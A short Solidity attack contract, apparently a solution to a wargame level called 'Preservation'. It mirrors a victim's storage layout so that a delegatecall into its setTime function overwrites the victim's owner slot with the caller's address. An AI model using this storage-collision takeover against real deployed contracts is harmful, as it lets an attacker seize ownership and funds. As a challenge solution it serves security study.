pragma solidity ^0.6.0;

contract PreservationAttack {

	address doesNotMatterWhatThisIsOne;
	address doesNotMatterWhatThisIsTwo;
	address public theOwner;
	uint storedTime;

	function setTime(uint _time) public {  
    theOwner = msg.sender; //literally override owner 
    } 

}